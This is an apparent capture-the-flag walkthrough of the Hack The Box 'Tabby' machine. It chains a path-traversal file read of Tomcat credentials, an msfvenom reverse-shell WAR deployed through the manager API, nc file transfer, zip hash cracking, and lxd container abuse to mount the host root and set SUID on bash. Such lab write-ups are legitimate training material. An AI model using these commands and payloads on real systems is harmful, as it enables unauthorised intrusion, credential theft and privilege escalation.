---
icon: ubuntu
---

# Tabby - Easy

<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/tabby"><strong>Tabby</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" overflow="wrap" expandable="true" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.13.200 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 00:30 -0400
Nmap scan report for 10.129.13.200
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   27.33 ms 10.10.16.1
2   56.19 ms 10.129.13.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.00 seconds
```
{% endcode %}

## <mark style="color:blue;">HTTP Port 8080 TCP</mark>

The nmap Scan confirms Apache Tomact on port 8080

### <mark style="color:$primary;">Website</mark>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The first page exposes some path location as well as a possible list of files. I'll Note it for later

### <mark style="color:$primary;">Directory Busting</mark>

{% code title="" overflow="wrap" expandable="true" %}
```shellscript
feroxbuster -u http://10.129.13.200:8080/ -n
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

With Directory Busting I was able to uncover some interesting endpoints. However I will need some credentials to move further

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">HTTP Port 80 TCP</mark>

### <mark style="color:$primary;">Tech Detection</mark>                                                                                                                 &#x20;

{% code title="curl -I http://10.129.13.200" overflow="wrap" expandable="true" %}
```shellscript
HTTP/1.1 200 OK
Date: Sat, 28 Mar 2026 04:38:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

I haven't uncovered anything major. We have an Apache Web Server&#x20;

### <mark style="color:$primary;">Site</mark>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

While Enumerating the site I saw that when the News Button contains a redirect&#x20;

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

This also shows the site running php and a domain name

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

I'll update my hosts file

{% code title="/etc/hosts" overflow="wrap" expandable="true" %}
```shellscript
10.129.13.200 megahosting.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Checking the URL there is a possibility for LFI. I will test it

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

and it works! Remember earlier we discovered a possible users file. Let's check it out!

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

There is a user with a hardcoded password in there! We can also check it via curl

{% code title="" overflow="wrap" expandable="true" %}
```shellscript
curl http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```shellscript
tomcat:$3cureP4s5w0rd123!
```
{% endcode %}

Now we should be able to login into [http://megahosting.htb:8080/host-manager/html](http://megahosting.htb:8080/host-manager/html)

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">War Deployment via web service -> RCE</mark>

My next goal was, WAR Deployment → RCE, but deployment is not available on the frontend.

If we go back to the `tomcat-users.xml` file we will see that the tomcat user has the manager-script role.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

This allows access to the text-based web service located at `/manager/text`. There’s a list of commands [in the Tomcat docs](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands).

Let's test it out with `list`&#x20;

{% code overflow="wrap" expandable="true" %}
```shellscript
curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/list
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

it works! Now that I have access to the manager I can Deploy a Malicious War file

I’ll use `msfvenon` to generate a Linux reverse shell:

{% code overflow="wrap" expandable="true" %}
```shellscript
msfvenom -p java/shell_reverse_tcp lhost=10.10.16.63 lport=443 -f war -o reverse.war
```
{% endcode %}

### <mark style="color:blue;">Upload Payload</mark>

Now I’ll use `curl` to send the payload. I’ll need to give it the application path (url), and send the payload using an HTTP PUT request. In `curl`, I’ll use `-T` or `--upload-file` to signify a PUT request:

{% code overflow="wrap" expandable="true" %}
```shellscript
curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/deimos --upload-file reverse.war
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Success!

Command Breakdwon:

* `-u 'tomcat:$3cureP4s5w0rd123!'` - the creds
* `/manager/text/deploy` - text-based path for `deploy` command
* `?path=/deimos` - the path I want the application to live at
* `--upload-file reverse.war` - war file to upload with HTTP PUT

Next I'll start a nc listener, and trigger the exploit with: `curl http://megahosting.htb:8080/deimos`

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as tomcat</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Besides root there is another user on this box. I should check for any possible Credentials on the machine.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

I saw an interesting folder owned by ash!

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Inside there is a backup file! I'll transfer it to my machine using nc

{% code title="Receiver" overflow="wrap" expandable="true" %}
```shellscript
nc -lvnp 443 > 16162020_backup.zip
```
{% endcode %}

{% code title="Sender" overflow="wrap" expandable="true" %}
```shellscript
nc 10.10.16.63 443 -q 0 < 16162020_backup.zip
```
{% endcode %}

### <mark style="color:blue;">Cracking zip file</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
zip2john 16162020_backup.zip > zip.hash
```
{% endcode %}

{% code overflow="wrap" expandable="true" %}
```shellscript
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

We managed to crack it. Funny enough this password works for ash

{% code overflow="wrap" expandable="true" %}
```shellscript
ash:admin@it
```
{% endcode %}

### <mark style="color:blue;">Su as ash</mark>

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Manual Enumeration</mark>

When running the id command we saw that ash was part of an interesting group `lxd`

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">LXC Exploitation -> privesc root</mark>

I can create a container and mount the root file system on Tabby into the container, where I then have full access to it.

There are currently no containers on the host:

<figure><img src="../../.gitbook/assets/image (3406).png" alt=""><figcaption></figcaption></figure>

I’ll need to bring a container to Tabby. I’ll grab the [LXD Alpina Linux image builder](https://github.com/saghul/lxd-alpine-builder)

{% code overflow="wrap" expandable="true" %}
```shellscript
git clone https://github.com/saghul/lxd-alpine-builder.git
```
{% endcode %}

This tool creates an Alpine Linux container image. I could do this with an OS flavor, but Alpine is nice because it’s really stripped down and small. I’ll go into that directory and run the builder:

{% code overflow="wrap" expandable="true" %}
```shellscript
└─$ sudo ./build-alpine                                                                                                                             
[sudo] password for kali: 
Determining the latest release... v3.23
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.23/main/x86_64
Downloading alpine-keys-2.6-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-3.0.5-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   3730 100   3730   0      0   1674      0   00:02   00:02              0
--2026-03-29 19:21:30--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.24, 2a00:1f00:dc06:10::6
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.24|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3730 (3.6K) [text/plain]
Saving to: ‘/home/kali/CyberTraining/HTB/Tabby/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/kali/CyberTraining/HTB/Tabby/l 100%[======================================================================>]   3.64K  --.-KB/s    in 0s      

2026-03-29 19:21:31 (503 MB/s) - ‘/home/kali/CyberTraining/HTB/Tabby/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [3730/3730]

Selecting mirror http://mirrors.dotsrc.org/alpine//v3.23/main
( 1/27) Installing alpine-baselayout-data (3.7.2-r0)
( 2/27) Installing musl (1.2.5-r21)
( 3/27) Installing busybox (1.37.0-r30)
  Executing busybox-1.37.0-r30.post-install
( 4/27) Installing busybox-binsh (1.37.0-r30)
( 5/27) Installing alpine-baselayout (3.7.2-r0)
  Executing alpine-baselayout-3.7.2-r0.pre-install
  Executing alpine-baselayout-3.7.2-r0.post-install
( 6/27) Installing bridge (1.5-r5)
( 7/27) Installing ifupdown-ng (0.12.1-r7)
( 8/27) Installing openrc-user (0.63-r1)
( 9/27) Installing libcap2 (2.77-r0)
(10/27) Installing openrc (0.63-r1)
  Executing openrc-0.63-r1.post-install
(11/27) Installing mdev-conf (4.9-r0)
(12/27) Installing busybox-mdev-openrc (1.37.0-r30)
(13/27) Installing alpine-conf (3.21.0-r0)
(14/27) Installing alpine-keys (2.6-r0)
(15/27) Installing alpine-release (3.23.3-r0)
(16/27) Installing libcrypto3 (3.5.5-r0)
(17/27) Installing libssl3 (3.5.5-r0)
(18/27) Installing ssl_client (1.37.0-r30)
(19/27) Installing zlib (1.3.2-r0)
(20/27) Installing libapk (3.0.5-r0)
(21/27) Installing ca-certificates-bundle (20251003-r0)
(22/27) Installing apk-tools (3.0.5-r0)
(23/27) Installing busybox-openrc (1.37.0-r30)
(24/27) Installing busybox-suid (1.37.0-r30)
(25/27) Installing scanelf (1.3.8-r2)
(26/27) Installing musl-utils (1.2.5-r21)
(27/27) Installing alpine-base (3.23.3-r0)
Executing busybox-1.37.0-r30.trigger
OK: 9900 KiB in 27 packages
```
{% endcode %}

When it finishes, there’s a `.tar.gz` package containing the files necessary to make an Alpine Linux container.

<figure><img src="../../.gitbook/assets/image (3408).png" alt=""><figcaption></figcaption></figure>

I’ll upload this to Tabby by running a Python webserver on my host `python3 -m http.server 80` and then running `wget` from Tabby:

<figure><img src="../../.gitbook/assets/image (3409).png" alt=""><figcaption></figcaption></figure>

Next I’ll import the image into `lxc`:

{% code overflow="wrap" expandable="true" %}
```shellscript
lxc image import /dev/shm/alpine-v3.23-x86_64-20260329_1921.tar.gz --alias deimos-image
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3410).png" alt=""><figcaption></figcaption></figure>

I’ll need to run `lxd init`. I can just accept all the defaults:

<figure><img src="../../.gitbook/assets/image (3411).png" alt=""><figcaption></figcaption></figure>

Now I’ll create a container from the image with the following options:

* `init` - action to take, starting a container
* `deimos-image` - the image to start
* `container-deimmos` - the alias for the running container
* `-c security.privileged=true` - by default, containers run as a non-root UID; this runs the container as root, giving it access to the host filesystem as root

{% code overflow="wrap" expandable="true" %}
```shellscript
lxc init deimos-image container-deimos -c security.privileged=true
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3412).png" alt=""><figcaption></figcaption></figure>

I’ll also mount part of the host file system into the container. This is useful to have a shared folder between the two. I’ll abuse it by mounting the host system root:

{% code overflow="wrap" expandable="true" %}
```shellscript
lxc config device add container-deimos device-deimos disk source=/ path=/mnt/root
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3413).png" alt=""><figcaption></figcaption></figure>

Now the container is setup and ready, just not running:

<figure><img src="../../.gitbook/assets/image (3414).png" alt=""><figcaption></figcaption></figure>

I’ll start the container:

<figure><img src="../../.gitbook/assets/image (3415).png" alt=""><figcaption></figcaption></figure>

The following `lxc exec` command returns a root shell inside the container:

{% code overflow="wrap" expandable="true" %}
```shellscript
lxc exec container-deimos /bin/sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3416).png" alt=""><figcaption></figcaption></figure>

The shell is inside the container:

<figure><img src="../../.gitbook/assets/image (3418).png" alt=""><figcaption></figcaption></figure>

If we move into the mounted drives we will see the host file system

<figure><img src="../../.gitbook/assets/image (3419).png" alt=""><figcaption></figcaption></figure>

With full system access to the host there are a couple of ways to get a shell as root

* edit `/etc/passwd`
* edit `/etc/sudoers`
* set the SUID on /bin/bash so it runs as root

I'll go for the 3rd option

<figure><img src="../../.gitbook/assets/image (3420).png" alt=""><figcaption></figcaption></figure>

Now if we got back to Tabby as the ash user will se the SUID set on bash

<figure><img src="../../.gitbook/assets/image (3421).png" alt=""><figcaption></figcaption></figure>
